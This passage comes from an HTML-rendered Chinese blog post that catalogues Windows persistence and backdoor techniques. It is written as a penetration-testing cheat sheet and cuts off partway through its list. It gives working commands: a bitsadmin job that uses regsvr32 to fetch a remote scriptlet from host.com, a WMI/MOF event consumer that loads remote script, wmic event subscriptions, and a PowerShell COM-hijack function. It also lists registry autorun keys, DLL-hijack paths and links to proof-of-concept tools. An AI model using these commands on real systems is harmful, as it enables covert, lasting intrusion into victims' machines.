#babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</span></span></code></pre></div><h5 id=\"4、BootExecute-Key\"><a href=\"#4、BootExecute-Key\" class=\"headerlink\" title=\"4、BootExecute Key\"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKLM\\SYSTEM\\CurrentControlSet\\Control\\hivelist</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet002\\Control\\Session Manager</span></span></code></pre></div><h5 id=\"5、Userinit-Key\"><a href=\"#5、Userinit-Key\" class=\"headerlink\" title=\"5、Userinit Key\"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</span></span></code></pre></div><h5 id=\"6、Startup-Keys\"><a href=\"#6、Startup-Keys\" class=\"headerlink\" title=\"6、Startup Keys\"></a>6、Startup Keys</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</span></span></code></pre></div><h5 id=\"7、Services\"><a href=\"#7、Services\" class=\"headerlink\" title=\"7、Services\"></a>7、Services</h5><p>创建服务 </p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">sc create [ServerName] binPath= BinaryPathName</span></span></code></pre></div><h5 id=\"8、Browser-Helper-Objects\"><a href=\"#8、Browser-Helper-Objects\" class=\"headerlink\" title=\"8、Browser Helper Objects\"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects</span></span></code></pre></div><h5 id=\"9、AppInit-DLLs\"><a href=\"#9、AppInit-DLLs\" class=\"headerlink\" title=\"9、AppInit_DLLs\"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs</span></span></code></pre></div><h5 id=\"10、文件关联\"><a href=\"#10、文件关联\" class=\"headerlink\" title=\"10、文件关联\"></a>10、文件关联</h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKEY_LOCAL_MACHINE\\Software\\Classes</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKEY_CLASSES_ROOT</span></span></code></pre></div><h5 id=\"11、bitsadmin\"><a href=\"#11、bitsadmin\" class=\"headerlink\" title=\"11、bitsadmin\"></a>11、<a href=\"http://www.liuhaihua.cn/archives/357579.html\">bitsadmin</a></h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">bitsadmin /create backdoor</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">bitsadmin /addfile backdoor %comspec% %temp%\\cmd.exe</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">bitsadmin.exe /SetNotifyCmdLine backdoor regsvr32.exe &quot;/u /s /i:https://host.com/calc.sct scrobj.dll&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">bitsadmin /Resume backdoor</span></span></code></pre></div><h5 id=\"12、mof\"><a href=\"#12、mof\" class=\"headerlink\" title=\"12、mof \"></a>12、<a href=\"https://evi1cg.me/archives/Powershell_MOF_Backdoor.html\">mof </a></h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">instance of __EventFilter as $EventFilter</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">EventNamespace = &quot;Root\\\\Cimv2&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Name = &quot;filtP1&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Query = &quot;Select * From __InstanceModificationEvent &quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&quot;And TargetInstance.Second = 1&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">QueryLanguage = &quot;WQL&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;; </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">instance of ActiveScriptEventConsumer as $Consumer</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Name = &quot;consP1&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ScriptingEngine = &quot;JScript&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">ScriptText = &quot;GetObject(\\&quot;script:https://host.com/test\\&quot;)&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;; </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">instance of __FilterToConsumerBinding</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Consumer = $Consumer;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Filter = $EventFilter;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;;</span></span></code></pre></div><p>管理员执行：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">mofcomp test.mof</span></span></code></pre></div><h5 id=\"13、wmi\"><a href=\"#13、wmi\" class=\"headerlink\" title=\"13、wmi\"></a>13、<a href=\"https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe\">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __EventFilter CREATE Name=&quot;BotFilter82&quot;, EventNameSpace=&quot;root\\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;BotConsumer23&quot;, ExecutablePath=&quot;C:\\Windows\\System32\\notepad.exe&quot;,CommandLineTemplate=&quot;C:\\Windows\\System32\\notepad.exe&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">wmic /NAMESPACE:&quot;\\\\root\\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\\&quot;BotFilter82\\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\\&quot;BotConsumer23\\&quot;&quot;</span></span></code></pre></div><h5 id=\"14、Userland-Persistence-With-Scheduled-Tasks\"><a href=\"#14、Userland-Persistence-With-Scheduled-Tasks\" class=\"headerlink\" title=\"14、Userland Persistence With Scheduled Tasks\"></a>14、<a href=\"https://3gstudent.github.io/Userland-registry-hijacking\">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">function Invoke-ScheduledTaskComHandlerUserTask</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">[CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#39;Medium&#39;)]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Param (</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">[Parameter(Mandatory = $True)]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">[ValidateNotNullOrEmpty()]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">[String]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$Command,</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">[Switch]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$Force</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">)</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">$ScheduledTaskCommandPath = &quot;HKCU:\\Software\\Classes\\CLSID\\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\\InprocServer32&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">if ($Force -or ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name &#39;(default)&#39; -ErrorAction SilentlyContinue) -eq $null))&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">New-Item $ScheduledTaskCommandPath -Force |</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">New-ItemProperty -Name &#39;(Default)&#39; -Value $Command -PropertyType string -Force | Out-Null</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;else&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Write-Verbose &quot;Key already exists, consider using -Force&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">exit</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\">if (Test-Path $ScheduledTaskCommandPath) &#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Write-Verbose &quot;Created registry entries to hijack the UserTask&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;else&#123;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Write-Warning &quot;Failed to create registry key, exiting&quot;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">exit</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125; </span></span>\n<span class=\"line\"><span style=\"color: #babed8\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Invoke-ScheduledTaskComHandlerUserTask -Command &quot;C:\\test\\testmsg.dll&quot; -Verbose</span></span></code></pre></div><h5 id=\"15、Netsh\"><a href=\"#15、Netsh\" class=\"headerlink\" title=\"15、Netsh\"></a>15、<a href=\"https://3gstudent.github.io/Netsh-persistence\">Netsh</a></h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">netsh add helper c:\\test\\netshtest.dll</span></span></code></pre></div><p>后门触发：每次调用netsh</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>dll编写:<a href=\"https://github.com/outflanknl/NetshHelperBeacon\">https://github.com/outflanknl/NetshHelperBeacon</a></p></blockquote>\n<h5 id=\"16、Shim\"><a href=\"#16、Shim\" class=\"headerlink\" title=\"16、Shim\"></a>16、<a href=\"https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims\">Shim</a></h5><p>常用方式：<br>InjectDll<br>RedirectShortcut<br>RedirectEXE</p>\n<h5 id=\"17、DLL劫持\"><a href=\"#17、DLL劫持\" class=\"headerlink\" title=\"17、DLL劫持\"></a>17、<a href=\"https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95\">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程<br>使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行<br>工具：<a href=\"https://github.com/sensepost/rattler\">https://github.com/sensepost/rattler</a><br>工具：<a href=\"https://github.com/Yonsm/AheadLib\">https://github.com/Yonsm/AheadLib</a></p>\n<h5 id=\"18、DoubleAgent\"><a href=\"#18、DoubleAgent\" class=\"headerlink\" title=\"18、DoubleAgent \"></a>18、<a href=\"https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)\">DoubleAgent </a></h5><p>编写自定义Verifier provider DLL<br>通过Application Verifier进行安装<br>注入到目标进程执行payload<br>每当目标进程启动，均会执行payload，相当于一个自启动的方式<br>POC : <a href=\"https://github.com/Cybellum/DoubleAgent\">https://github.com/Cybellum/DoubleAgent</a></p>\n<h5 id=\"19、waitfor-exe\"><a href=\"#19、waitfor-exe\" class=\"headerlink\" title=\"19、waitfor.exe \"></a>19、<a href=\"https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence\">waitfor.exe </a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe<br>POC : <a href=\"https://github.com/3gstudent/Waitfor-Persistence\">https://github.com/3gstudent/Waitfor-Persistence</a></p>\n<h5 id=\"20、AppDomainManager\"><a href=\"#20、AppDomainManager\" class=\"headerlink\" title=\"20、AppDomainManager\"></a>20、<a href=\"https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence\">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>\n<h5 id=\"21、Office\"><a href=\"#21、Office\" class=\"headerlink\" title=\"21、Office\"></a>21、Office</h5><p><a href=\"https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8\">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门<br><a href=\"https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8\">利用VSTO实现的office后门</a><br><a href=\"https://github.com/3gstudent/Office-Persistence\">Office加载项</a></p>\n<ul>\n<li>Word WLL </li>\n<li>Excel XLL </li>\n<li>Excel VBA add-ins </li>\n<li>PowerPoint VBA add-ins</li>\n</ul>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>参考1 ：<a href=\"https://3gstudent.github.io/Use-Office-to-maintain-persistence\">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p></blockquote>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>参考2 ：<a href=\"https://3gstudent.github.io/Office-Persistence-on-x64-operating-system\">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p></blockquote>\n<h5 id=\"22、CLR\"><a href=\"#22、CLR\" class=\"headerlink\" title=\"22、CLR\"></a>22、<a href=\"https://3gstudent.github.io/Use-CLR-to-maintain-persistence\">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序<br>POC:<a href=\"https://github.com/3gstudent/CLR-Injection\">https://github.com/3gstudent/CLR-Injection</a></p>\n<h5 id=\"23、msdtc\"><a href=\"#23、msdtc\" class=\"headerlink\" title=\"23、msdtc\"></a>23、<a href=\"https://3gstudent.github.io/Use-msdtc-to-maintain-persistence\">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测<br>利用：向 %windir%\\system32\\目录添加dll并重命名为oci.dll</p>\n<h5 id=\"24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato\"><a href=\"#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato\" class=\"headerlink\" title=\"24、Hijack CAccPropServicesClass and MMDeviceEnumerato\"></a>24、<a href=\"https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator\">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限<br>通过修改注册表实现<br>POC：<a href=\"https://github.com/3gstudent/COM-Object-hijacking\">https://github.com/3gstudent/COM-Object-hijacking</a> </p>\n<h5 id=\"25、Hijack-explorer-exe\"><a href=\"#25、Hijack-explorer-exe\" class=\"headerlink\" title=\"25、Hijack explorer.exe\"></a>25、<a href=\"https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe\">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限<br>通过修改注册表实现</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">HKCU\\Software\\Classes\\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKCU\\Software\\Classes\\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKCU\\Software\\Classes\\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">HKCU\\Software\\Classes\\Wow6432Node\\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span></span></code></pre></div><h5 id=\"26、Windows-FAX-DLL-Injection\"><a href=\"#26、Windows-FAX-DLL-Injection\" class=\"headerlink\" title=\"26、Windows FAX DLL Injection\"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载<br>Explorer.exe在启动时会加载<code>c:\\Windows\\System32\\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\\Windows\\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>\n<h5 id=\"27、特殊注册表键值\"><a href=\"#27、特殊注册表键值\" class=\"headerlink\" title=\"27、特殊注册表键值\"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</p>\n<p><a href=\"https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA\">《渗透技巧——“隐藏”注册表的创建》</a></p>\n<p><a href=\"https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95\">《渗透技巧——“隐藏”注册表的更多测试》</a></p>\n<h5 id=\"28、快捷方式后门\"><a href=\"#28、快捷方式后门\" class=\"headerlink\" title=\"28、快捷方式后门\"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数<br>POC : <a href=\"https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1\">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>\n<h5 id=\"29、Logon-Scripts\"><a href=\"#29、Logon-Scripts\" class=\"headerlink\" title=\"29、Logon Scripts\"></a>29、<a href=\"https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence\">Logon Scripts</a></h5><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" 